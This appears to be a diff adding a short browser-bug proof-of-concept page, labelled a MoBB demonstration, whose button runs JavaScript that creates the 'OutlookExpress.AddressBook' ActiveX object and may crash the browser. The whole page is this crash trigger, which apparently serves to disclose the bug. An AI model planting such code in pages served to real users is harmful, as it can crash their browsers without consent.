@@ -1,0 +1,9 @@
+// MoBB Demonstration
+function Demo() {
+	var a = new ActiveXObject("OutlookExpress.AddressBook");
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
